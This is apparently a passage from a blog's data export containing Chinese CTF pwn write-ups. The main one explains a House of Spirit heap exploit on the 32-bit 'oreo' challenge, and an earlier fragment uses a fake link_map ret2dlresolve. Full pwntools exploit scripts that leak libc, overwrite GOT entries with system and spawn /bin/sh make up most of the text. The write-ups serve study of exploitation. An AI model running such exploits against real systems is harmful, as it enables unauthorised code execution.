class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;../story_attachment/libc.so.6&#x27;</span>)  </span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># p=remote(&#x27;node2.yuzhian.com.cn&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">s(<span class=\"string\">&#x27;V2VsY29tZSB0byBOS0NURiE=&#x27;</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">s(<span class=\"string\">&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6&#x27;</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">s(<span class=\"string\">&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&#x27;</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">s(<span class=\"string\">&#x27;Y2FuIHlvdSBmaW5kIG1lPw==&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">read_plt=elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]  </span><br><span class=\"line\">write_got=elf.got[<span class=\"string\">&#x27;read&#x27;</span>]  </span><br><span class=\"line\">vuln_addr=elf.sym[<span class=\"string\">&#x27;main&#x27;</span>]  </span><br><span class=\"line\">plt0=elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bss  </span></span><br><span class=\"line\">bss=<span class=\"number\">0x404060</span> </span><br><span class=\"line\">bss_stage=bss+<span class=\"number\">0x100</span></span><br><span class=\"line\">l_addr=libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]  </span><br><span class=\"line\">  </span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x0000000000401683</span>  </span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x0000000000401681</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">plt_load=plt0+<span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fake_Linkmap_payload</span>(<span class=\"params\">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class=\"line\">    linkmap=p64(offset&amp;(<span class=\"number\">2</span>**<span class=\"number\">64</span>-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>) </span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr+<span class=\"number\">0x18</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64((fake_linkmap_addr+<span class=\"number\">0x30</span>-offset)&amp;(<span class=\"number\">2</span>**<span class=\"number\">64</span>-<span class=\"number\">1</span>)) </span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0x7</span>) </span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>) </span><br><span class=\"line\">    linkmap+=p64(known_func_ptr - <span class=\"number\">0x8</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">    linkmap=linkmap.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr) </span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr+<span class=\"number\">0x38</span>) </span><br><span class=\"line\">    linkmap=linkmap.ljust(<span class=\"number\">0xf8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr+<span class=\"number\">0x8</span>) </span><br><span class=\"line\">    <span class=\"keyword\">return</span> linkmap</span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map=fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">56</span>+p64(pop_rdi)+p64(<span class=\"number\">0</span>)+p64(pop_rsi)+p64(bss_stage)+p64(<span class=\"number\">0</span>)+p64(read_plt)</span><br><span class=\"line\">payload+=p64(pop_rsi)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">payload+=p64(pop_rdi)+p64(bss_stage+<span class=\"number\">0x48</span>)+p64(plt_load)+p64(bss_stage)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sl(payload)  </span><br><span class=\"line\"></span><br><span class=\"line\">s(fake_link_map) </span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"orea","date":"2023-01-02T11:54:26.000Z","_content":"\nHouse of Spirit，32位的堆题\n\n<!-- more -->\n\n## orea\n\n通过做题学习一下House of Spirit。\n\n这是一个32位的堆题。\n\n结构体rifle\n\n```c\nstruct rifle\n{\n    char description[0x19];\n    char name[0x1b]\n    rifle* pre;\n}\n```\n\n主要的漏洞在new功能处，在写入description和name时均有溢出，可以写入0x38byte，借此可以控制指针pre。\n\n通过控制pre指针为__isoc99_scanf的got表地址-0x19，使用show_rifles功能可以输出其got表项的内容，从而泄露libc。\n\n之后便是利用House of Spirit，来申请fake chunk到notice附近，通过修改notice获得任意写。\n\n伪造fake chunk重点是要绕过free的检查，这里fake chunk的构造可以选择0x0804A2A0处，可以通过修改count来修改size，并且该chunk的地址也对齐了，同时next chunk的size可以通过leave_rifles进行改写，原来的notice指向0x0804A2C0所以可以写到后面。\n\n![fake](./oreo/fake.jpg)\n\n构造好fake chunk后，先利用溢出改写pre指针指向fake chunk，然后调用order进行释放。由于其LIFO的特点，我们下一次malloc即可malloc到fake chunk。notice就在user data部分，直接写入description即可改写notice实现任意写。\n\n得到任意写后可以改写__isoc99_scanf的GOT表项为system。现在只要在Action: 后面输入/bin/sh即可get shell。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='i386')\nelf=ELF(\"./oreo2\")\nlibc=ELF(\"./libc-2.23.so\")\np=process(\"./oreo2\",stdin=PTY)#有了这个才行\n#By default, a pipe is used. A pty can be used instead by setting this to PTY\n#默认情况下通过管道输入，让stdin=PTY可以使用一个伪终端输入，借此可以recv()更多？\n#不加stdin=PTY只能recv()到Exit!\\n\n\ndef add(name, descr):\n\tp.recvuntil('Action: ')\n\tp.sendline('1')\n\tp.recvuntil(\"name: \")\n\tp.sendline(name)\n\tp.recvuntil(\"description: \" )\n\tp.sendline(descr)\n\ndef show_rifles():\n\tp.recvuntil(\"Action: \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"Name: \")\n\ndef free():\n\tp.recvuntil(\"Action: \")\n\tp.sendline(\"3\")\n\ndef leave(message):\n\tp.recvuntil(\"Action: \")\n\tp.sendline(\"4\")\n\tp.recvuntil(\"order: \")\n\tp.sendline(message)\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\n\n#print(hex(elf.got['puts']))\nsscanf=0x0804A258\n\n#leak libc\npayload1='a'*0x1b+p32(sscanf-0x19)\nadd(payload1,'aaaa')\nshow_rifles()\n\np.recvuntil(\"Name: \")\n#print(u32(p.recv(4)))\nlibcbase=u32(p.recv(4))-libc.sym['__isoc99_sscanf']\nprint(\"[*]libcbase: {:}\".format(hex(libcbase)))\n\n#use House of Spirit to overwrite notice\n\nfake_chunk=0x0804A2A0\n\n\nfor i in range(0x40-1):#add count\n\tadd('a','b')\n\npayload2='a'*0x1b+p32(fake_chunk+0x8)\nadd(payload2,'a1ph0nse')\n\nmsg='\\x00'*0x24+p32(0x41)\nleave(msg)#overwrite the next chunk of fake chunk\n\nfree()\n\n\nadd('asd',p32(elf.got['__isoc99_sscanf']))#malloc fake chunk and overwrite __isoc99_scanf\n\n\n#get shell\nmsg2=libcbase+libc.sym['system']\n\nleave(p32(msg2))#overwrite __isoc00_scanf to system\n\np.recvuntil('Action: ')\np.sendline('/bin/sh\\x00')\n\n\n#debug()\n\np.interactive()\n```","source":"_posts/oreo.md","raw":"---\ntitle: orea\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- house_of_xxx\n\n---\n\nHouse of Spirit，32位的堆题\n\n<!-- more -->\n\n## orea\n\n通过做题学习一下House of Spirit。\n\n这是一个32位的堆题。\n\n结构体rifle\n\n```c\nstruct rifle\n{\n    char description[0x19];\n    char name[0x1b]\n    rifle* pre;\n}\n```\n\n主要的漏洞在new功能处，在写入description和name时均有溢出，可以写入0x38byte，借此可以控制指针pre。\n\n通过控制pre指针为__isoc99_scanf的got表地址-0x19，使用show_rifles功能可以输出其got表项的内容，从而泄露libc。\n\n之后便是利用House of Spirit，来申请fake chunk到notice附近，通过修改notice获得任意写。\n\n伪造fake chunk重点是要绕过free的检查，这里fake chunk的构造可以选择0x0804A2A0处，可以通过修改count来修改size，并且该chunk的地址也对齐了，同时next chunk的size可以通过leave_rifles进行改写，原来的notice指向0x0804A2C0所以可以写到后面。\n\n![fake](./oreo/fake.jpg)\n\n构造好fake chunk后，先利用溢出改写pre指针指向fake chunk，然后调用order进行释放。由于其LIFO的特点，我们下一次malloc即可malloc到fake chunk。notice就在user data部分，直接写入description即可改写notice实现任意写。\n\n得到任意写后可以改写__isoc99_scanf的GOT表项为system。现在只要在Action: 后面输入/bin/sh即可get shell。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='i386')\nelf=ELF(\"./oreo2\")\nlibc=ELF(\"./libc-2.23.so\")\np=process(\"./oreo2\",stdin=PTY)#有了这个才行\n#By default, a pipe is used. A pty can be used instead by setting this to PTY\n#默认情况下通过管道输入，让stdin=PTY可以使用一个伪终端输入，借此可以recv()更多？\n#不加stdin=PTY只能recv()到Exit!\\n\n\ndef add(name, descr):\n\tp.recvuntil('Action: ')\n\tp.sendline('1')\n\tp.recvuntil(\"name: \")\n\tp.sendline(name)\n\tp.recvuntil(\"description: \" )\n\tp.sendline(descr)\n\ndef show_rifles():\n\tp.recvuntil(\"Action: \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"Name: \")\n\ndef free():\n\tp.recvuntil(\"Action: \")\n\tp.sendline(\"3\")\n\ndef leave(message):\n\tp.recvuntil(\"Action: \")\n\tp.sendline(\"4\")\n\tp.recvuntil(\"order: \")\n\tp.sendline(message)\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\n\n#print(hex(elf.got['puts']))\nsscanf=0x0804A258\n\n#leak libc\npayload1='a'*0x1b+p32(sscanf-0x19)\nadd(payload1,'aaaa')\nshow_rifles()\n\np.recvuntil(\"Name: \")\n#print(u32(p.recv(4)))\nlibcbase=u32(p.recv(4))-libc.sym['__isoc99_sscanf']\nprint(\"[*]libcbase: {:}\".format(hex(libcbase)))\n\n#use House of Spirit to overwrite notice\n\nfake_chunk=0x0804A2A0\n\n\nfor i in range(0x40-1):#add count\n\tadd('a','b')\n\npayload2='a'*0x1b+p32(fake_chunk+0x8)\nadd(payload2,'a1ph0nse')\n\nmsg='\\x00'*0x24+p32(0x41)\nleave(msg)#overwrite the next chunk of fake chunk\n\nfree()\n\n\nadd('asd',p32(elf.got['__isoc99_sscanf']))#malloc fake chunk and overwrite __isoc99_scanf\n\n\n#get shell\nmsg2=libcbase+libc.sym['system']\n\nleave(p32(msg2))#overwrite __isoc00_scanf to system\n\np.recvuntil('Action: ')\np.sendline('/bin/sh\\x00')\n\n\n#debug()\n\np.interactive()\n```","slug":"oreo","published":1,"updated":"2023-01-02T15:51:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagd00585oud4mi7ftis","content":"<p>House of Spirit，32位的堆题</p>\n<span id=\"more\"></span>\n\n<h2 id=\"orea\"><a href=\"#orea\" class=\"headerlink\" title=\"orea\"></a>orea</h2><p>通过做题学习一下House of Spirit。</p>\n<p>这是一个32位的堆题。</p>\n<p>结构体rifle</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rifle</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> description[<span class=\"number\">0x19</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">0x1b</span>]</span><br><span class=\"line\">    rifle* pre;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>主要的漏洞在new功能处，在写入description和name时均有溢出，可以写入0x38byte，借此可以控制指针pre。</p>\n<p>通过控制pre指针为__isoc99_scanf的got表地址-0x19，使用show_rifles功能可以输出其got表项的内容，从而泄露libc。</p>\n<p>之后便是利用House of Spirit，来申请fake chunk到notice附近，通过修改notice获得任意写。</p>\n<p>伪造fake chunk重点是要绕过free的检查，这里fake chunk的构造可以选择0x0804A2A0处，可以通过修改count来修改size，并且该chunk的地址也对齐了，同时next chunk的size可以通过leave_rifles进行改写，原来的notice指向0x0804A2C0所以可以写到后面。</p>\n<p><img src=\"./oreo/fake.jpg\" alt=\"fake\"></p>\n<p>构造好fake chunk后，先利用溢出改写pre指针指向fake chunk，然后调用order进行释放。由于其LIFO的特点，我们下一次malloc即可malloc到fake chunk。notice就在user data部分，直接写入description即可改写notice实现任意写。</p>\n<p>得到任意写后可以改写__isoc99_scanf的GOT表项为system。现在只要在Action: 后面输入/bin/sh即可get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./oreo2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.23.so&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./oreo2&quot;</span>,stdin=PTY)<span class=\"comment\">#有了这个才行</span></span><br><span class=\"line\"><span class=\"comment\">#By default, a pipe is used. A pty can be used instead by setting this to PTY</span></span><br><span class=\"line\"><span class=\"comment\">#默认情况下通过管道输入，让stdin=PTY可以使用一个伪终端输入，借此可以recv()更多？</span></span><br><span class=\"line\"><span class=\"comment\">#不加stdin=PTY只能recv()到Exit!\\n</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name, descr</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;description: &quot;</span> )</span><br><span class=\"line\">\tp.sendline(descr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show_rifles</span>():</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;order: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(message)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(hex(elf.got[&#x27;puts&#x27;]))</span></span><br><span class=\"line\">sscanf=<span class=\"number\">0x0804A258</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\">payload1=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1b</span>+p32(sscanf-<span class=\"number\">0x19</span>)</span><br><span class=\"line\">add(payload1,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">show_rifles()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(u32(p.recv(4)))</span></span><br><span class=\"line\">libcbase=u32(p.recv(<span class=\"number\">4</span>))-libc.sym[<span class=\"string\">&#x27;__isoc99_sscanf&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]libcbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libcbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#use House of Spirit to overwrite notice</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk=<span class=\"number\">0x0804A2A0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x40</span>-<span class=\"number\">1</span>):<span class=\"comment\">#add count</span></span><br><span class=\"line\">\tadd(<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1b</span>+p32(fake_chunk+<span class=\"number\">0x8</span>)</span><br><span class=\"line\">add(payload2,<span class=\"string\">&#x27;a1ph0nse&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">msg=<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x24</span>+p32(<span class=\"number\">0x41</span>)</span><br><span class=\"line\">leave(msg)<span class=\"comment\">#overwrite the next chunk of fake chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">&#x27;asd&#x27;</span>,p32(elf.got[<span class=\"string\">&#x27;__isoc99_sscanf&#x27;</span>]))<span class=\"comment\">#malloc fake chunk and overwrite __isoc99_scanf</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\">msg2=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">leave(p32(msg2))<span class=\"comment\">#overwrite __isoc00_scanf to system</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>House of Spirit，32位的堆题</p>","more":"<h2 id=\"orea\"><a href=\"#orea\" class=\"headerlink\" title=\"orea\"></a>orea</h2><p>通过做题学习一下House of Spirit。</p>\n<p>这是一个32位的堆题。</p>\n<p>结构体rifle</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rifle</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> description[<span class=\"number\">0x19</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">0x1b</span>]</span><br><span class=\"line\">    rifle* pre;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>主要的漏洞在new功能处，在写入description和name时均有溢出，可以写入0x38byte，借此可以控制指针pre。</p>\n<p>通过控制pre指针为__isoc99_scanf的got表地址-0x19，使用show_rifles功能可以输出其got表项的内容，从而泄露libc。</p>\n<p>之后便是利用House of Spirit，来申请fake chunk到notice附近，通过修改notice获得任意写。</p>\n<p>伪造fake chunk重点是要绕过free的检查，这里fake chunk的构造可以选择0x0804A2A0处，可以通过修改count来修改size，并且该chunk的地址也对齐了，同时next chunk的size可以通过leave_rifles进行改写，原来的notice指向0x0804A2C0所以可以写到后面。</p>\n<p><img src=\"./oreo/fake.jpg\" alt=\"fake\"></p>\n<p>构造好fake chunk后，先利用溢出改写pre指针指向fake chunk，然后调用order进行释放。由于其LIFO的特点，我们下一次malloc即可malloc到fake chunk。notice就在user data部分，直接写入description即可改写notice实现任意写。</p>\n<p>得到任意写后可以改写__isoc99_scanf的GOT表项为system。现在只要在Action: 后面输入/bin/sh即可get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span 